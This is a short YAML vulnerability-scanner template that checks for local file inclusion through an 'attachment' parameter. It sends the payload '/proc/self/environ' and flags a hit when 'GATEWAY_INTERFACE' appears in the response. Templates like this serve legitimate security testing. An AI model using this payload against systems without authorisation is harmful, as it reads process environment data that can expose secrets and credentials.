id: lfi6-0686
name: 'Traversal in attachment'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via attachment'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      attachment:
        - '/proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
